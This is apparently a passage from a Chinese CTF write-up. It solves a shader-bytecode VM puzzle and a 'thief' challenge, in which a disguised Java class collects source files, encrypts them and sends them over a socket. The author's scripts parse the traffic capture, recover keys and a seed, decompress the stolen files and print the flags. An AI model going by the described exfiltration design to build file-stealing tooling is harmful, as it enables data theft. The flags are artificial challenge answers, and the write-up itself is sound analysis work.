  mad r0.yz, -cb0[0].xxyx, cb0[1].yyyy, r0.yyzy
  sample_l_indexable(texture2d)(float,float,float,float) r2.xyzw, r0.yzyy, t1.xyzw, s0, l(0)
endif 
add r1.xyzw, -r2.xyzw, l(0, 0, 0, 1)
mad r0.xyzw, r0.xxxx, r1.xyzw, r2.xyzw
store_uav_typed u0.xyzw, vThreadID.xyyy, r0.xyzw
ret 
```

K0：单线程解释执行 coTex里的 RGBA 字节码维护 mem[32] 和 reg[16]，按 opcode 做立即数赋值、从 WorkTex(u0) 读字节、XOR、8-bit 循环移位、乘法/加法混淆、比较设条件与条件跳转；执行结束后把 reg[0..15] 归一化为 float 写回 WorkTex 的 16×1 像素。

K1：每个线程处理一个 i（0..15）：从 WorkTex(u0) 读 work[i]（red*255 取整 &255），计算 ((work[i] + i) & 0xFF)，再从 ciTex(t0) 读 ci[i]（同样取整 &255），若 ci[i] != ((work[i] + i) & 0xFF) 就把 SharedState[0]（u1[0]）写成 1 表示失败；等价通过条件是 work[i] = (ci[i] - i) & 0xFF。

K2：典型 tile 渲染/后处理：对输出纹理 u0 的每个像素做边界检查后，按常量缓冲 CB0 计算归一化坐标并做 sincos 旋转/缩放偏移；根据 SharedState[0]（u1[0]）选择采样 t0（状态=0）或 t1（状态=1，否则输出黑），再按 r0.x 做一次向黑/alpha=1 的线性淡出混合，最后写回 u0

VM字节码和比较值来自于coTex.png和ciTex.png，写脚本提取出来：

```Python
from PIL import Image

img = Image.open("ciTex.png").convert("RGBA")
w, h = img.size

px = img.load()
ci = [px[x, 0][0] for x in range(w)]  
print(ci)

t = [(ci[i] - i) & 0xFF for i in range(len(ci))]
print("target :", t)
from PIL import Image

img = Image.open("coTex.png").convert("RGBA")
w, h = img.size
assert h == 1, f"expected 1xH image, got {w}x{h}"

rgba = [img.getpixel((x, 0)) for x in range(w)]  
print(rgba)
```

得到：

```Rust
ci: [233, 142, 138, 138, 183, 231, 201, 224, 184, 151, 183, 75, 59, 33, 211, 124]
target : [233, 141, 136, 135, 179, 226, 195, 217, 176, 142, 173, 64, 47, 20, 197, 109]
[(0, 1, 0, 42), (0, 2, 0, 0), (1, 0, 2, 0), (2, 0, 1, 0), (3, 0, 2, 0), (4, 0, 0, 7), (6, 0, 2, 0), (7, 2, 0, 0), (6, 1, 0, 0), (5, 2, 2, 1), (8, 2, 0, 16), (9, 0, 0, 247), (10, 0, 0, 0)]
```

VM字节码梳理过后是如下逻辑：

```Rust
初始 state = 42
对每个 i：
v = inp[i] ^ state
v = rol8(v, i)
v = (v * 7) & 0xFF
v = (v + i) & 0xFF
out[i] = v
state = (state + out[i]) & 0xFF
```

7 mod 256 可逆，逆元为183，写逆为：

```Rust
初始 state = 42
对每个 i，已知 out[i]=o：
w = (o - i) & 0xFF
u = (w * 183) & 0xFF 
v = ror8(u, i) 
inp[i] = v ^ state
state = (state + o) & 0xFF
```

连续逆三轮即可，exp如下：

```Python
def rol8(x, s): s &= 7; return ((x << s) | (x >> (8 - s))) & 0xFF
def ror8(x, s): s &= 7; return ((x >> s) | (x << (8 - s))) & 0xFF
INV7 = 183  
def Finv(out):
    state = 42
    inp = []
    for i, o in enumerate(out):
        w = (o - i) & 0xFF
        u = (w * INV7) & 0xFF
        v = ror8(u, i)
        inp.append(v ^ state)
        state = (state + o) & 0xFF
    return inp

ci = [233,142,138,138,183,231,201,224,184,151,183,75,59,33,211,124]
t  = [(ci[i] - i) & 0xFF for i in range(16)]

x = t
for _ in range(3):
    x = Finv(x)

print(bytes(x).decode('ascii')) 
```

flag为：`alictf{5haderVM_Rep3at!}`

## thief

unkown.zip里藏的.webp魔数是cafebabe，实际上是.class文件

梳理逻辑，整体逻辑如下：

在某个根目录（user.dir 的 parent）下递归搜集最多 9 个 .java 文件

每 3 个文件为一批，然后进行如下操作：

1. 读取文件内容
2. 用自定义 LZRR 压缩（每个文件独立压缩块）
3. 拼接所有块
4. 生成随机 8 字节会话 key，并把它用 RSA(65537) 公钥加密写进包头
5. 用 Runner.encrypt(algo2/3, data, key) 对 payload 加密/混淆
6. 将结果通过 Socket 发往 127.0.0.1:8889

那么首先从流量包里解析3 个 batch payload

```Python
import struct
import collections
from pathlib import Path

PCAP = Path("dump.pcapng")
OUT  = Path("batches")
OUT.mkdir(parents=True, exist_ok=True)

def parse_pcapng(path: Path):
    b = path.read_bytes()
    off = 0
    interfaces = []
    packets = []  # (iface_id, ts, caplen, pktlen, pktdata)

    while off + 12 <= len(b):
        block_type, total_len = struct.unpack_from("<II", b, off)
        if total_len < 12 or off + total_len > len(b):
            break
        body = b[off+8 : off+total_len-4]
        if block_type == 0x00000001:  # IDB
            linktype, _, snaplen = struct.unpack_from("<HHi", body, 0)
            interfaces.append({"linktype": linktype, "snaplen": snaplen})
        elif block_type == 0x00000006:  # EPB
            iface_id, ts_high, ts_low, caplen, pktlen = struct.unpack_from("<IIIII", body, 0)
            pkt_data = body[20:20+caplen]
            ts = (ts_high << 32) | ts_low
            packets.append((iface_id, ts, caplen, pktlen, pkt_data))
        off += total_len

    return interfaces, packets

def ipv4_parse(pkt: bytes):
    if len(pkt) < 20:
        return None
    vihl = pkt[0]
    ver = vihl >> 4
    ihl = (vihl & 0x0F) * 4
    if ver != 4 or len(pkt) < ihl:
        return None
    total_len = struct.unpack_from(">H", pkt, 2)[0]
    proto = pkt[9]
    src = ".".join(map(str, pkt[12:16]))
    dst = ".".join(map(str, pkt[16:20]))
    payload = pkt[ihl:total_len]
    return {"proto": proto, "src": src, "dst": dst, "payload": payload}

def tcp_parse(seg: bytes):
    if len(seg) < 20:
        return None
    sport, dport, seq, ack, off_flags, *_ = struct.unpack_from(">HHIIHHHH", seg, 0)
    off = (off_flags >> 12) * 4
    if len(seg) < off:
        return None
    payload = seg[off:]
    return {"sport": sport, "dport": dport, "seq": seq, "ack": ack, "payload": payload}

def reassemble(segments):
    segs = [s for s in segments if s[2]]  # (seq, ts, payload)
    segs.sort(key=lambda x: x[0])
    out = bytearray()
    base = segs[0][0]
    cur = base
    for seq, ts, payload in segs:
        if seq > cur:
            out.extend(b"\x00" * (seq - cur))
            cur = seq
        if seq < cur:
            start = cur - seq
            if start < len(payload):
                out.extend(payload[start:])
                cur += len(payload) - start
        else:
            out.extend(payload)
            cur += len(payload)
    return bytes(out)

def parse_app_payload(blob: bytes):
    assert blob[:4] == b"\x89ali", "bad magic"
    batch = struct.unpack_from("<I", blob, 4)[0]
    rsa_len = struct.unpack_from("<I", blob, 8)[0]
    off = 12
    rsa = blob[off:off+rsa_len]
    off += rsa_len
    file_count = struct.unpack_from("<I", blob, off)[0]
    off += 4

    files = []
    for _ in range(file_count):
        name_len = struct.unpack_from("<I", blob, off)[0]; off += 4
        name_xor = blob[off:off+name_len]; off += name_len
        name = bytes([c ^ 233 for c in name_xor]).decode("utf-8", "replace")
        foff = struct.unpack_from("<I", blob, off)[0]; off += 4
        files.append((name, foff))

    cipher = blob[off:]
    return batch, rsa, files, cipher

def main():
    ifaces, pkts = parse_pcapng(PCAP)

    # 只关心：DLT_NULL(0) + AF_INET(2) + TCP
    streams = collections.defaultdict(list)  # key=(src_ip, sport, dst_ip, dport)
    for iface_id, ts, caplen, pktlen, pktdata in pkts:
        if ifaces[iface_id]["linktype"] != 0:
            continue
        fam = struct.unpack_from("<I", pktdata, 0)[0]
        if fam != 2:
            continue
        ip = ipv4_parse(pktdata[4:])
        if not ip or ip["proto"] != 6:
            continue
        tcp = tcp_parse(ip["payload"])
        if not tcp:
            continue
        key = (ip["src"], tcp["sport"], ip["dst"], tcp["dport"])
        streams[key].append((tcp["seq"], ts, tcp["payload"]))

    # 找 client->server（dport=8889）的 3 条流并解析 payload
    for key in streams:
        if key[3] != 8889:
            continue
        blob = reassemble(streams[key])
        batch, rsa, files, cipher = parse_app_payload(blob)

        (OUT / f"batch{batch}_rsa.bin").write_bytes(rsa)
        (OUT / f"batch{batch}_cipher.bin").write_bytes(cipher)

        # 顺便把文件表写出来方便后续
        with open(OUT / f"batch{batch}_files.txt", "w", encoding="utf-8") as f:
            for name, off in files:
                f.write(f"{off}\t{name}\n")

        print(f"[+] batch {batch}: rsa={len(rsa)} bytes, files={len(files)}, cipher={len(cipher)} bytes")

if __name__ == "__main__":
    main()
```

解析完得到：

```Rust
0        unknown/app/src/main/java/com/unknown/AbstractPatternMachine.java
3576        flagImage/Image1Part3.java
21277        flagImage/Image1Part1.java
0        unknown/app/src/main/java/com/unknown/ParticlePhysicsSimulator.java
3577        flagImage/Image1Part4.java
21084        flagImage/Image1Part2.java
0        unknown/app/src/main/java/com/unknown/GeneticAlgorithmEngine.java
3080        flagImage/Image1Part5.java
22774        flagImage/Image1Part6.java
```

flag被分成了六份，需要解密RSA并且解 LZRR 压缩

batch1和3的key加密不依赖于seed，流密码直接xor，然后key 是base64 字符串，存在 l1I.webp（类 i.l.l1I）的常量池里。

写个脚本提取一下

```Python
import struct, re
from pathlib import Path

CLASS = Path("app/src/main/res/mipmap-hdpi/l1I.webp").read_bytes()

def utf8_strings(class_bytes: bytes):
    cp_count = struct.unpack_from(">H", class_bytes, 8)[0]
    off = 10
    res = []
    i = 1
    while i < cp_count:
        tag = class_bytes[off]; off += 1
        if tag == 1:
            ln = struct.unpack_from(">H", class_bytes, off)[0]; off += 2
            s  = class_bytes[off:off+ln].decode("utf-8", "replace"); off += ln
            res.append(s)
        elif tag in (3,4): off += 4
        elif tag in (5,6): off += 8; i += 1
        elif tag in (7,8,16,19,20): off += 2
        elif tag in (9,10,11,12,17,18): off += 4
        elif tag == 15: off += 3
        else: raise ValueError(tag)
        i += 1
    return res

cands = [s for s in utf8_strings(CLASS) if s.startswith("azQyMw") and len(s) > 1000]
assert len(cands) == 2

Path("key0.b64").write_text(cands[0], encoding="utf-8")
Path("key1.b64").write_text(cands[1], encoding="utf-8")
```

 写一个decrypt.java去调用 `i.l.Runner.encrypt()`进行解密

```Java
import java.nio.file.*;
import java.util.Base64;
import i.l.Runner;

public class Decrypt {
    public static void main(String[] args) throws Exception {
        if (args.length != 4) {
            System.err.println("Usage: java Decrypt <key.b64> <seedHex(16)> <in.bin> <out.bin>");
            return;
        }
        byte[] key = Base64.getDecoder().decode(Files.readAllBytes(Paths.get(args[0])));
        long seed  = Long.parseUnsignedLong(args[1], 16);
        byte[] in  = Files.readAllBytes(Paths.get(args[2]));
        byte[] out = Runner.encrypt(key, in, seed);
        Files.write(Paths.get(args[3]), out);
    }
}
```

然后seed随便给就行，类似于：

```Bash
java -cp work/recovered_classes:. Decrypt work/key1.b64 0000000000000000 \
  work/batches/batch1_cipher.bin work/out/batch1_plain.bin

java -cp work/recovered_classes:. Decrypt work/key1.b64 0000000000000000 \
  work/batches/batch3_cipher.bin work/out/batch3_plain.bin
```

得到解密后的bin

Il1.Il1(byte[])` 是压缩器,解压缩:

```Python
import struct, zlib

def _bit_iter(data: bytes, start: int):
    for byte in data[start:]:
        for i in range(7, -1, -1):
            yield (byte >> i) & 1

def _read_bits(bits, n: int) -> int:
    v = 0
    for _ in range(n):
        v = (v << 1) | next(bits)
    return v

def lzrr_decompress(comp: bytes) -> bytes:
    if len(comp) < 16:
        raise ValueError("too short")
    magic = struct.unpack_from(">I", comp, 0)[0]
    if magic != 0x4c5a5252:
        raise ValueError("bad magic")
    ver = struct.unpack_from(">H", comp, 4)[0]
    if ver != 513:
        raise ValueError("bad ver")

    orig_len = struct.unpack_from(">I", comp, 8)[0]
    crc      = struct.unpack_from(">I", comp, 12)[0]

    bits = _bit_iter(comp, 16)
    out = bytearray()

    while len(out) < orig_len:
        t = next(bits)
        if t == 0:
            out.append(_read_bits(bits, 8))
        else:
            # offset
            if next(bits) == 0:
                offset = _read_bits(bits, 8)
            else:
                offset = _read_bits(bits, 16)

            # length
            if next(bits) == 0:
                length = 3 + _read_bits(bits, 3)
            else:
                if next(bits) == 0:
                    length = 3 + 8 + _read_bits(bits, 6)
                else:
                    length = 3 + _read_bits(bits, 8)

            start = len(out) - offset
            for i in range(length):
                out.append(out[start + i])

    out = bytes(out[:orig_len])

    # 可选校验
    if (zlib.crc32(out) & 0xffffffff) != crc:
        pass

    return out
```

文件表里给的是每个文件在“明文流”里的 offset。明文流结构就是：

[file0 LZRR blob][file1 LZRR blob][file2 LZRR blob]...需要文件切片

调用解码器去解压并切片：

```Python
from pathlib import Path
from lzrr import lzrr_decompress

def read_file_table(path: Path):
    items = []
    for line in path.read_text(encoding="utf-8").splitlines():
        off, name = line.split("\t", 1)
        items.append((int(off), name))
    items.sort()
    return items

def unpack_one(batch_id: int):
    base = Path("work")
    plain = (base / "out" / f"batch{batch_id}_plain.bin").read_bytes()
    table = read_file_table(base / "batches" / f"batch{batch_id}_files.txt")
    out_dir = base / "out" / f"batch{batch_id}_files"
    out_dir.mkdir(parents=True, exist_ok=True)

    for i, (off, name) in enumerate(table):
        end = table[i+1][0] if i+1 < len(table) else len(plain)
        comp = plain[off:end]
        data = lzrr_decompress(comp)
        (out_dir / name).write_bytes(data)

if name == "main":
    unpack_one(1)
    unpack_one(3)
```

每个 Image1Part 是：private static final String IMAGE_DATA = "....base64....";写脚本提取出来即可

提取脚本：

```Python
import re, base64
from pathlib import Path

def extract_jpg(java_path: Path, out_path: Path):
    s = java_path.read_text(encoding="utf-8", errors="ignore")
    m = re.search(r'IMAGE_DATA\s*=\s*"([^"]+)"', s)
    assert m, "no IMAGE_DATA"
    b64 = m.group(1)
    out_path.write_bytes(base64.b64decode(b64))
    
  extract_jpg(Path("out/batch3_files/flagImage_Image1Part3.java"),
            Path("out/flag_part_3.jpg"))
```

解压解密后得到flag part 1，3，5，6

对于batch2，利用明文线性仿射得到seed

用题目压缩器 Il1 压缩 ParticlePhysicsSimulator.java

用一个 Java wrapper 调 `i.l.Il1.Il1(byte[])`：

```Java
import java.nio.file.*;
import i.l.Il1;

public class Compress {
    public static void main(String[] args) throws Exception {
        byte[] in = Files.readAllBytes(Paths.get(args[0]));
        byte[] out = Il1.Il1(in);
        System.out.write(out);
    }
}
```

编译并运行：

```Rust
javac -cp work/recovered_classes Compress.java
java -cp work/recovered_classes:. Compress \
  work/unknown_zip/app/src/main/java/com/unknown/ParticlePhysicsSimulator.java \
  > work/out/pps_comp.bin
```

计算 keystream：K = C XOR P

取 batch2 ciphertext 的前 3577 bytes，和 pps_comp.bin xor：

```Python
from pathlib import Path

C = (Path("work/batches/batch2_cipher.bin").read_bytes())[:3577]
P = Path("work/out/pps_comp.bin").read_bytes()
K = bytes([a ^ b for a, b in zip(C, P)])  # keystream 前缀
Path("work/out/ks_prefix.bin").write_bytes(K)
```

我们可以用 `Runner.encrypt(key0, zeros, seed)` 直接得到 `K(seed)`（因为输入全 0，输出就是 keystream）。 而：

```Rust
K(s1) XOR K(s2) XOR K(0) == K(s1 XOR s2)
```

这说明是仿射线性：`K(seed) = K(0) XOR (A * seed_bits)`。

因此用 64 个 basis seed（`1<<i`）采样就能建立线性方程组，做高斯消元解出 seed。

```Python
import subprocess
from pathlib import Path

JAVA_CP = "recovered_classes:."
KEY0    = "key0.b64"
ZEROS64 = "out/zeros64.bin"
OUTTMP  = "out/_ks_tmp.bin"

Path(ZEROS64).write_bytes(b"\x00"*64)

def keystream64(seed_hex: str) -> bytes:
    subprocess.run(
        ["java", "-cp", JAVA_CP, "Decrypt", KEY0, seed_hex, ZEROS64, OUTTMP],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    return Path(OUTTMP).read_bytes()

def xor_bytes(a,b): return bytes(x^y for x,y in zip(a,b))

def bytes_to_bits_le(b: bytes):
    bits=[]
    for byte in b:
        for k in range(8):
            bits.append((byte>>k)&1)  # 低位->高位：只要一致即可
    return bits

def solve_seed_from_keystream(K_obs: bytes, prefix_bytes=16) -> int:
    K0 = keystream64("0000000000000000")[:prefix_bytes]
    d  = xor_bytes(K_obs[:prefix_bytes], K0)
    d_bits = bytes_to_bits_le(d)
    n_eq = len(d_bits)

    # columns[i] 是 seed 第 i 位对输出 bits 的贡献
    cols = []
    for i in range(64):
        Ki = keystream64(f"{1<<i:016x}")[:prefix_bytes]
        cols.append(bytes_to_bits_le(xor_bytes(Ki, K0)))

    # 组装为 row 方程：rows[j] 是第 j 条方程的 64-bit 系数
    rows = []
    rhs  = []
    for j in range(n_eq):
        coeff = 0
        for i in range(64):
            if cols[i][j]:
                coeff |= (1<<i)
        rows.append(coeff)
        rhs.append(d_bits[j])

    # GF(2) 高斯消元
    piv = [-1]*64
    r = 0
    for c in range(64):
        pivot = None
        for rr in range(r, n_eq):
            if (rows[rr]>>c)&1:
                pivot = rr
                break
        if pivot is None:
            continue
        rows[r], rows[pivot] = rows[pivot], rows[r]
        rhs[r],  rhs[pivot]  = rhs[pivot],  rhs[r]
        piv[c] = r
        for rr in range(n_eq):
            if rr != r and ((rows[rr]>>c)&1):
                rows[rr] ^= rows[r]
                rhs[rr]  ^= rhs[r]
        r += 1

    # 回代
    x = 0
    for c in range(63, -1, -1):
        pr = piv[c]
        if pr == -1:
            continue
        rest = rows[pr] & ~(1<<c)
        s = rhs[pr] ^ (bin(rest & x).count("1") & 1)
        if s:
            x |= (1<<c)
    return x

# 观测 keystream：来自 C XOR P
K_obs = Path("out/ks_prefix.bin").read_bytes()
seed = solve_seed_from_keystream(K_obs, prefix_bytes=16)
print("seed =", f"{seed:016x}")
```

得到seed：a91b1bb4e8978bda

 用seed 解 batch2，得到 Image1Part2 / Image1Part4

```Rust
java -cp work/recovered_classes:. Decrypt work/key0.b64 a91b1bb4e8978bda \
  work/batches/batch2_cipher.bin work/out/batch2_plain.bin
```

然后像 batch1/batch3 一样切片 + LZRR 解压 + 提取 base64，即可得到flag_part_2.jpg和flag_part_4.jpg

最后写个脚本拼起来得到完整图片：

![img](28.png)

flag为：`alictf{5a8e0fb1-d3f5-4b13-8424-164faab9bbd2}`
